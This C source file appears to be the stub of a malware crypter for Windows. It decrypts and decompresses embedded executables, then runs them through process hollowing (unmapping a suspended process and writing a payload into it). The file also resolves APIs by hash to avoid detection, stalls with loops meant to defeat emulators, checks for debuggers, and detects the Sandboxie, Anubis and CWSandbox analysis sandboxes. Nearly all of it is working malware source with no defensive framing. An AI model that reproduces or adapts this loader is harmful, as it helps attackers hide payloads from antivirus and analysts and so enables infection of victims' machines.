#include <windows.h>
#include <tlhelp32.h>
#include "depack.h"


/////////////////////////////////////////////////////
/////////////////////STUB SECTION////////////////////
/////////////////////////////////////////////////////

typedef LONG NTSTATUS;

//declarations.
void memset_(BYTE* s, BYTE c, DWORD size);
BOOL MemExecute(LPVOID pBuffer, LPTSTR szTargetProc, LPTSTR szParameters, WORD wVisible);
unsigned int DJBHash(char* str);
LPVOID GetAPI_FROM_DJB(const LPVOID library, const unsigned int APIHASH);
LPVOID get_k32base();
void fillAPIPtrs();

WORD antis();
unsigned int aP_depack(void *source, void *destination);
DWORD CallAPIbyHash(DWORD dwPtr, WORD n, ...);
void dec(BYTE* in, BYTE* out, DWORD size);

//consts section
#pragma data_seg(".cnsts")
#pragma pack(1)
static char ntdll[] = "ntdll.dll";
static char user32[] = "user32";
static char sbiedll_dll[] = "iedll.dll";
static char sample_exe[] = "mple.exe";
static DWORD Mapping[8] = { PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE };
#pragma pack()
#pragma data_seg()
#pragma comment(linker, "/section:.cnsts,WRS")
////////////////


#pragma pack(1)
typedef struct
{
	DWORD dwAddress;
	DWORD dwPackedSize;
	DWORD dwUnpackedSize;
} FileInfo;
#pragma pack()

//data section
#pragma data_seg(".sdata")

static FileInfo *pFileArray = NULL;
static DWORD dwNumFiles = 0;

static NTSTATUS (WINAPI* ZwUnmapViewOfSection)(HANDLE, LPVOID) = NULL;

static LPVOID (WINAPI* pVirtualAlloc)(LPVOID, DWORD, DWORD, DWORD) = NULL;
static BOOL (WINAPI* pVirtualFree)(LPVOID, DWORD, DWORD) = NULL;

static LPSTR (WINAPI* pGetCommandLine)(VOID) = NULL;

static BOOL (WINAPI* pCloseHandle)(HANDLE) = NULL;

static LRESULT (WINAPI* pCallWindowProc)(WNDPROC, HWND, UINT, WPARAM, LPARAM) = NULL;

static HMODULE (WINAPI* pLoadLibrary)(LPCTSTR) = NULL;

static DWORD dwKey = 0;
#pragma data_seg()
#pragma comment(linker, "/section:.sdata,WRS")
////////////////

#define dwCreateProcess 0xd646480e
#define dwGetThreadContext 0x3be23af7
#define dwSetThreadContext 0xce600183
#define dwReadProcessMemory 0x10bff62e
#define dwWriteProcessMemory 0xcce9f53d
#define dwVirtualAllocEx 0x1aff74a9
#define dwVirtualProtectEx 0x2851fd5f
#define dwResumeThread 0xb13e4323
#define dwTerminateProcess 0xb0ee72a2
#define dwGetModuleHandle 0xaa54aa8d
#define dwCreateToolhelp32Snapshot 0xa6c2e2ca
#define dwModule32First 0x836fed2d
#define dwModule32Next 0x785d0c64
#define dwlstrlen 0xa49ab13f
#define dwlstrcmpi 0x37526d89
#define dwGetModuleFileName 0x717fadc2
#define dwProcess32First 0xba09d266
#define dwProcess32Next 0x7242ae7d
#define dwVirtualAlloc 0x7554284c
#define dwGetProcAddress 0xf6c2d514
#define dwSleep 0x40e99053

#pragma code_seg(".loader")

//entry
int WINAPI stub_entry()
{
	DWORD i, x, dwBase;
	BYTE *pWorkspace, *pDecryptspace;
	int state;
	unsigned long somePi;
	unsigned long denom;

	somePi = 1;
	denom = 3;
	state = -1;
	for (x = 1; x > 0;) //just a loop to waste time & cpu to discourage emulation.
	{
		i = 100;

		do
		{
			i--;
			somePi += state * (1/denom);
			state = -state;
			denom += 2;
		} while (i > 1);

		if (i)
		{
			somePi += state * (1/denom);
			state = -state;
			denom += 2;
			x += i;
		}
		else
			break;

		x > (WORD)dwKey ? x = 0 : x = (x - i) + 1;
	}

	dec((BYTE*)&ntdll[0], (BYTE*)&ntdll[0], ((DWORD)&Mapping[0]) - (DWORD)&ntdll[0]);

	somePi *= 4;

	if (antis() != 0)
	{
		for (x = 0; x < dwKey - dwCreateProcess;) //infinite loop, x always == 0
		{
			__asm nop
			__asm nop
			__asm nop

			for (i = x; i >= 1; i--)
			{
				__asm nop
				__asm nop
				__asm nop
			}

			i ? x += i : x >>= 1;
		}
		return 0;
	}

	dwBase = (DWORD)CallAPIbyHash(dwGetModuleHandle, 1, NULL);
	pFileArray = (FileInfo*)((BYTE*)pFileArray + dwBase);

	for (i = 0; i < dwNumFiles; i++)
	{
		pDecryptspace = (BYTE*)CallAPIbyHash(dwVirtualAlloc, 4, NULL, pFileArray[i].dwPackedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (pDecryptspace)
		{
			pWorkspace = (BYTE*)CallAPIbyHash(dwVirtualAlloc, 4, NULL, pFileArray[i].dwUnpackedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

			if (pWorkspace)
			{
				dec((BYTE*)dwBase + pFileArray[i].dwAddress, pDecryptspace, pFileArray[i].dwPackedSize);

				if (aP_depack(pDecryptspace, pWorkspace))
				{
					do
					{
						CallAPIbyHash(dwSleep, 1, (unsigned long)somePi * 10);
					} while (!MemExecute(pWorkspace, pGetCommandLine(), NULL, SW_SHOW));
				}

				pVirtualFree(pWorkspace, 0, MEM_RELEASE);
			}
			pVirtualFree(pDecryptspace, 0, MEM_RELEASE);
		}
	}

	return 0;
}

void dec(BYTE* in, BYTE* out, DWORD size)
{
	DWORD x, i;

	x = 0xFFFF1100;
	do
	{
		if (x)
		{
			for (i = 100; i > 1; i--);
			x += i;
		}
		else
			break;
	} while (true);

	while (size--)
	{
		*out = *in ^ *((BYTE*)&dwKey + (size % 4));
		*out = (*out << 4) + (*out >> 4);
		out++;
		in++;
	}
}

DWORD CallAPIbyHash(DWORD dwPtr, WORD n, ...) //might help to avoid some detections better than just storing ptrs, idk. thx anyway vb coders.
{
	BYTE* asmbuff;
	DWORD ret;
	WORD i;
	va_list ap;


	asmbuff = (BYTE*)pVirtualAlloc(NULL, 17 + (5 * n), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!asmbuff)
		return (DWORD)-1;

	*(DWORD*)asmbuff = (DWORD)GetAPI_FROM_DJB(get_k32base(), dwPtr);
	if (!(*(DWORD*)asmbuff))
		return (DWORD)-1;

	*(DWORD*)&asmbuff[4] = 0x59595958;
	*(WORD*)&asmbuff[8] = 0x5059;

	va_start(ap, n);

	for (i = n - 1; i != (WORD)-1; i--)
	{
		asmbuff[10 + (5 * i)] = 0x68;
		*(DWORD*)&asmbuff[10 + (5 * i) + 1] = va_arg(ap, DWORD);
	}

	va_end(ap);

	*(WORD*)&asmbuff[10 + (n * 5)] = 0x15FF;
	*(DWORD*)&asmbuff[12 + (n * 5)] = (DWORD)asmbuff;
	asmbuff[16 + (n * 5)] = 0xC3;

	ret = pCallWindowProc((WNDPROC)(asmbuff + 4), 0, 0, 0, 0);

	pVirtualFree(asmbuff, 0, MEM_RELEASE);

	return ret;
}

char* StripFileName(char* szPath)
{
	int i;
	i = CallAPIbyHash(dwlstrlen, 1, szPath);
	if (i-- > 3)
	{
		while (i && szPath[i] != '\\')
		{
			i--;
		}
		if (i > 0 && szPath[i] == '\\')
		{
			return &szPath[i+1];
		}
	}
	return szPath;
}

WORD antis()
//compilation of some anti-w/e functions. Don't know the original authors since most of these methods have been posted under so many different names.
{
	HANDLE hSnapShot;
	MODULEENTRY32 me;
//	PROCESSENTRY32 pe;
	char* szMe, *szEXEName;
	BYTE beingdebugged=0;
	WORD i;
//	DWORD dwParentID;

	fillAPIPtrs();

	//some generic anti-debugs from some article somewhere. checks PEB flags to see if process is being debugged. not very good anti-debug but w/e
	__asm
	{
		pushad
		mov eax, fs:[30h]
		mov esi, eax
		mov al, byte ptr [eax + 2]
		test al, al
		jne Debugged

		mov eax, [esi + 68h]
		and eax, 70h
		test eax, eax
		jne Debugged

		mov eax, [esi + 18h]
		mov eax, [eax + 10h]
		test eax, eax
		jne Debugged

		jmp AllGood
Debugged:
		mov [beingdebugged], 1
AllGood:
		popad
	}

	if (beingdebugged || *(BYTE*)GetAPI_FROM_DJB(get_k32base(), dwCreateProcess) == 0xE9) //being debugged or probable usermode hook.
		return -1;

	hSnapShot = (HANDLE)CallAPIbyHash(dwCreateToolhelp32Snapshot, 2, TH32CS_SNAPMODULE, 0);
	if (hSnapShot != INVALID_HANDLE_VALUE)
	{
		me.dwSize = sizeof(MODULEENTRY32);
		if (CallAPIbyHash(dwModule32First, 2, hSnapShot, (DWORD)&me))
		{
			do
			{
				if (CallAPIbyHash(dwlstrlen, 1, me.szModule) > 10)
				{
					if (me.szModule[0] == 's' || me.szModule[0] == 'S')
					{
						//SbieDll.dll
						if (CallAPIbyHash(dwlstrcmpi, 2, (DWORD)&me.szModule[2], (DWORD)sbiedll_dll) == 0)
						{
							//in sandboxie
							pCloseHandle(hSnapShot);
							return 1;
						}
					}
				}
			}
			while (CallAPIbyHash(dwModule32Next, 2, hSnapShot, (DWORD)&me));
		}
		pCloseHandle(hSnapShot);
	}

	szMe = (char*)pVirtualAlloc(NULL, MAX_PATH + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (szMe)
	{
		CallAPIbyHash(dwGetModuleFileName, 3, NULL, szMe, MAX_PATH);
		szEXEName = StripFileName(szMe);
		if (szEXEName - szMe == 3 && CallAPIbyHash(dwlstrlen, 1, szEXEName) > 9 && (szEXEName[0] == 's' || szEXEName[0] == 'S'))
		{
			//check if path is ???s?mple.exe (anti-anubis)
			if (CallAPIbyHash(dwlstrcmpi, 2, &szEXEName[2], sample_exe) == 0)
			{
				pVirtualFree(szMe, 0, MEM_RELEASE);
				return 3;
			}
		}
		
		if (szEXEName - szMe == 3 && CallAPIbyHash(dwlstrlen, 1, szEXEName) > 4 && (szEXEName[0] >= '0' && szEXEName[0] <= '9'))
		{
			//check if path is ???###...#.w/e (anti-cwsandbox)
			for (i = 0; szEXEName[i]; i++)
			{
				if (szEXEName[i] < '0' || szEXEName[i] > '9')
					break;
			}
			if (szEXEName[i] == '.')
			{
				pVirtualFree(szMe, 0, MEM_RELEASE);
				return 3;
			}
		}

		//check to make sure parent process is explorer.exe (general, unsafe & may hinder execution, should remove.)
/*		hSnapShot = (HANDLE)CallAPIbyHash(dwCreateToolhelp32Snapshot, 2, TH32CS_SNAPPROCESS, 0);
		if (hSnapShot != INVALID_HANDLE_VALUE)
		{
			pe.dwSize = sizeof(PROCESSENTRY32);
			if (CallAPIbyHash(dwProcess32First, 2, hSnapShot, &pe))
			{
				do
				{
					if (CallAPIbyHash(dwlstrcmpi, 2, pe.szExeFile, szEXEName) == 0)
					{
						dwParentID = pe.th32ParentProcessID;
						break;
					}
				}
				while (CallAPIbyHash(dwProcess32Next, 2, hSnapShot, &pe));
			}
			if (dwParentID)
			{
				if (CallAPIbyHash(dwProcess32First, 2, hSnapShot, &pe))
				{
					do
					{
						if (dwParentID == pe.th32ProcessID)
						{
							if (CallAPIbyHash(dwlstrlen, 1, pe.szExeFile) != 12 || ((pe.szExeFile[0] != 'e' && pe.szExeFile[0] != 'E')))
							{
								pCloseHandle(hSnapShot);
								pVirtualFree(szMe, 0, MEM_RELEASE);
								return 4;
							}
						}
					}
					while (CallAPIbyHash(dwProcess32Next, 2, hSnapShot, &pe));
				}
			}
			pCloseHandle(hSnapShot);
		}
		*/
		pVirtualFree(szMe, 0, MEM_RELEASE);
	}

	return 0;
}

unsigned int DJBHash(char* str) //not by me. idk where from, just some generic hash function.
//modified to specifically hash null terminated strings
{
   unsigned int hash = 0x01b63a;

   for(; *str; str++)
   {
      hash = ((hash << 5) + hash) + (*str);
   }
   return hash;	
}

LPVOID GetAPI_FROM_DJB(const LPVOID library, const unsigned int APIHASH)
//GetProcAddress replacement
{
	DWORD x;
	if (library)
	{
		PIMAGE_EXPORT_DIRECTORY lExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)library + ((PIMAGE_NT_HEADERS)((DWORD)library + ((PIMAGE_DOS_HEADER)library)->e_lfanew))->OptionalHeader.DataDirectory[0].VirtualAddress);

		DWORD *Names = (DWORD*)((DWORD)library + lExport->AddressOfNames);
		WORD *Ordinals = (WORD*)((DWORD)library + lExport->AddressOfNameOrdinals);
		DWORD *Functions = (DWORD*)((DWORD)library + lExport->AddressOfFunctions);

		x = lExport->NumberOfNames;

		for (x = 0; x < lExport->NumberOfNames; x++)
		{
			if (DJBHash((char*)(Names[x] + (DWORD)library)) == APIHASH)
				return (LPVOID)(Functions[Ordinals[x]] + (DWORD)library);
		}
	}
	return NULL;
}

LPVOID get_k32base() //by vecna or somebody from 29a, I think. nabbed from some old drocon src.
//get kernel32 base from PEB
{
	LPVOID k32base;
	__asm
	{
	    pushad
	    sub eax,eax
	    add eax,fs:[eax+30h]
	    test eax,eax
	    js os_9x

	    mov eax,[eax+0ch]
	    mov esi,[eax+1ch]
	    lodsd
	    mov eax,[eax+8]
	    jmp finished
	os_9x:
	    mov eax,[eax+34h]
	    lea eax,[eax+7ch]
	    mov eax,[eax+3ch]
	finished:
		mov [k32base],eax
	    popad
    }

	return k32base;
}

void fillAPIPtrs()
{
	void* k32;
	k32 = get_k32base();

	*(void**)&pVirtualAlloc = GetAPI_FROM_DJB(k32, dwVirtualAlloc);
	*(void**)&pVirtualFree = GetAPI_FROM_DJB(k32, 0xf40d2543);

	*(void**)&pGetCommandLine = GetAPI_FROM_DJB(k32, 0xcec654e2);

	*(void**)&pCloseHandle = GetAPI_FROM_DJB(k32, 0xc5ee201c);

	*(void**)&pLoadLibrary = GetAPI_FROM_DJB(k32, 0x9ce809b0);

	k32 = (void*)pLoadLibrary(user32);
	*(void**)&pCallWindowProc = GetAPI_FROM_DJB(k32, 0xd2a9a303);

	k32 = (void*)pLoadLibrary(ntdll);
	*(void**)&ZwUnmapViewOfSection = GetAPI_FROM_DJB(k32, 0xe97171b1);
}




void memset_(BYTE* s, BYTE c, DWORD size)
{
	while (size--)
		*(s++) = c;
}


BOOL MemExecute(LPVOID pBuffer, LPTSTR szTargetProc, LPTSTR szParameters, WORD wVisible)
//you know what it is.
{
	DWORD dwBaseAddr, dwBytes;
	LPVOID pBase;

	DWORD x,i;

	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	CONTEXT Context;

	PIMAGE_NT_HEADERS pNT = NULL;
	PIMAGE_SECTION_HEADER pSections = NULL;

	memset_((BYTE*)&si, 0, sizeof(STARTUPINFO));
	memset_((BYTE*)&pi, 0, sizeof(PROCESS_INFORMATION));

	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = wVisible;

	for (x = 1; x < (WORD)dwKey;) //another loop 'cause why the hell not.
	{
		__asm nop
		__asm nop
		__asm nop
		for (i = x; i > (WORD)(dwKey % x ? dwKey % x : 1); i--)
		{
			__asm nop
			__asm nop
			__asm nop
		}

		i ? x += i : x >>= 1;
	}

	if (CallAPIbyHash(dwCreateProcess, 10, NULL, szTargetProc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		Context.ContextFlags = CONTEXT_INTEGER;

		if (CallAPIbyHash(dwGetThreadContext, 2, pi.hThread, &Context))
		{
			if (CallAPIbyHash(dwReadProcessMemory, 5, pi.hProcess, (LPCVOID)(Context.Ebx + 8), &dwBaseAddr, sizeof(DWORD), &dwBytes))
			{
				if (ZwUnmapViewOfSection(pi.hProcess, (LPVOID)dwBaseAddr) >= 0)
				{
					pNT = (PIMAGE_NT_HEADERS)((char*)pBuffer + ((PIMAGE_DOS_HEADER)pBuffer)->e_lfanew);

					pBase = (LPVOID)CallAPIbyHash(dwVirtualAllocEx, 5, pi.hProcess, (LPVOID)pNT->OptionalHeader.ImageBase, pNT->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

					if (pBase)
					{
						if (CallAPIbyHash(dwWriteProcessMemory, 5, pi.hProcess, pBase, pBuffer, pNT->OptionalHeader.SizeOfHeaders, &dwBytes))
						{
							pSections = (PIMAGE_SECTION_HEADER)((char*)pNT + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + pNT->FileHeader.SizeOfOptionalHeader);

							for (i = 0; i < pNT->FileHeader.NumberOfSections; i++)
							{
								//duh, if SizeOfRawData == 0 (stupid delphi apps), shit fails.
//								if (CallAPIbyHash(dwWriteProcessMemory, 5, pi.hProcess, (LPVOID)((DWORD)pBase + pSections[i].VirtualAddress), (LPVOID)((DWORD)pBuffer + pSections[i].PointerToRawData), pSections[i].SizeOfRawData, &dwBytes) == 0)
//									break;
								CallAPIbyHash(dwWriteProcessMemory, 5, pi.hProcess, (LPVOID)((DWORD)pBase + pSections[i].VirtualAddress), (LPVOID)((DWORD)pBuffer + pSections[i].PointerToRawData), pSections[i].SizeOfRawData, &dwBytes);
								CallAPIbyHash(dwVirtualProtectEx, 5, pi.hProcess, (LPVOID)((DWORD)pBase + pSections[i].VirtualAddress), pSections[i].Misc.VirtualSize, Mapping[pSections[i].Characteristics >> 29], &dwBytes);
							}

							if (i == pNT->FileHeader.NumberOfSections && CallAPIbyHash(dwWriteProcessMemory, 5, pi.hProcess, (LPVOID)(Context.Ebx + 8), &pBase, sizeof(LPVOID), &dwBytes))
							{
								Context.Eax = (DWORD)pBase + pNT->OptionalHeader.AddressOfEntryPoint;
								if (CallAPIbyHash(dwSetThreadContext, 2, pi.hThread, &Context) != 0)
								{
									CallAPIbyHash(dwResumeThread, 1, pi.hThread);
									return TRUE;
								}
							}
						}
					}
				}
			}
		}
		CallAPIbyHash(dwTerminateProcess, 2, pi.hProcess, 0);
	}
	return FALSE;
}

// \/\/ aPlib decompression routines by Jørgen Ibsen. pure copy & paste.
typedef struct {
    unsigned char *source;
    unsigned char *destination;
    unsigned int tag;
    unsigned int bitcount;
} APDEPACKDATA;

int aP_getbit(APDEPACKDATA *ud)
{
    unsigned int bit;

    /* check if tag is empty */
    if (!ud->bitcount--)
    {
        /* load next tag */
        ud->tag = *ud->source++;
        ud->bitcount = 7;
    }

    /* shift bit out of tag */
    bit = (ud->tag >> 7) & 0x01;
    ud->tag <<= 1;

    return bit;
}

unsigned int aP_getgamma(APDEPACKDATA *ud)
{
    unsigned int result = 1;

    /* input gamma2-encoded bits */
    do {
        result = (result << 1) + aP_getbit(ud);
    } while (aP_getbit(ud));

    return (result);
}

unsigned int aP_depack(void *source, void *destination)
{
    APDEPACKDATA ud;
    unsigned int offs, len, R0, LWM;
    int done;
    int i;

    ud.source = (unsigned char *) source;
    ud.destination = (unsigned char *) destination;
    ud.bitcount = 0;

    LWM = 0;
    done = 0;

    /* first byte verbatim */
    *ud.destination++ = *ud.source++;

    /* main decompression loop */
    while (!done)
    {
        if (aP_getbit(&ud))
        {
            if (aP_getbit(&ud))
            {
                if (aP_getbit(&ud))
                {
                    offs = 0;

                    for (i = 4; i; i--) offs = (offs << 1) + aP_getbit(&ud);

                    if (offs)
                    {
                        *ud.destination = *(ud.destination - offs);
                        ud.destination++;
                    } else {
                        *ud.destination++ = 0x00;
                    }

                    LWM = 0;

                } else {

                    offs = *ud.source++;

                    len = 2 + (offs & 0x0001);

                    offs >>= 1;

                    if (offs)
                    {
                        for (; len; len--)
                        {
                            *ud.destination = *(ud.destination - offs);
                            ud.destination++;
                        }
                    } else done = 1;

                    R0 = offs;
                    LWM = 1;
                }

            } else {

                offs = aP_getgamma(&ud);

                if ((LWM == 0) && (offs == 2))
                {
                    offs = R0;

                    len = aP_getgamma(&ud);

                    for (; len; len--)
                    {
                        *ud.destination = *(ud.destination - offs);
                        ud.destination++;
                    }

                } else {

                    if (LWM == 0) offs -= 3; else offs -= 2;

                    offs <<= 8;
                    offs += *ud.source++;

                    len = aP_getgamma(&ud);

                    if (offs >= 32000) len++;
                    if (offs >= 1280) len++;
                    if (offs < 128) len += 2;

                    for (; len; len--)
                    {
                        *ud.destination = *(ud.destination - offs);
                        ud.destination++;
                    }

                    R0 = offs;
                }

                LWM = 1;
            }

        } else {

            *ud.destination++ = *ud.source++;
            LWM = 0;
        }
    }

    return ud.destination - (unsigned char *) destination;
}

#pragma code_seg()
#pragma comment(linker, "/section:.loader,EWRS")
/////////////////////////////////////////////////////
/////////////////////////////////////////////////////
/////////////////////////////////////////////////////